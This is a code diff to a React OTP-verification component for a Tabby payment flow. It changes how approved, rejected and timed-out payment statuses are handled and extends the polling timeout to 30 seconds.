@@ -81,29 +81,39 @@ const TabbyOtpVerification = () => {
             console.error("Error polling status:", statusError);
             return;
           }
+          console.log("Payment status:", statusData.payment_status);
           if (statusData.payment_status === "approved") {
             if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
             if (timeoutRef.current) clearTimeout(timeoutRef.current);
-            window.location.href = "/tabby-payment";
+            setVerificationStatus("success");
+            setTimeout(() => {
+              navigate(`/tabby-payment?paymentId=${paymentId}&price=${price}&company=${company}`);
+            }, 1500);
           } else if (statusData.payment_status === "rejected") {
             if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
             if (timeoutRef.current) clearTimeout(timeoutRef.current);
-            setVerificationStatus("idle");
-            setOtp(["", "", "", ""]);
-            inputRefs.current[0]?.focus();
+            setVerificationStatus("error");
+            setTimeout(() => {
+              setVerificationStatus("idle");
+              setOtp(["", "", "", ""]);
+              inputRefs.current[0]?.focus();
+            }, 2000);
           }
         } catch (pollError) {
           console.error("Polling error:", pollError);
         }
       }, 1000);
 
-      // Timeout after 5 seconds - return to idle if no response
+      // Timeout after 30 seconds - return to idle if no response
       timeoutRef.current = setTimeout(() => {
         if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-        setVerificationStatus("idle");
-        setOtp(["", "", "", ""]);
-        inputRefs.current[0]?.focus();
-      }, 5000);
+        setVerificationStatus("error");
+        setTimeout(() => {
+          setVerificationStatus("idle");
+          setOtp(["", "", "", ""]);
+          inputRefs.current[0]?.focus();
+        }, 2000);
+      }, 30000);
     } catch (error) {
       console.error("OTP verification error:", error);
       setVerificationStatus("idle");
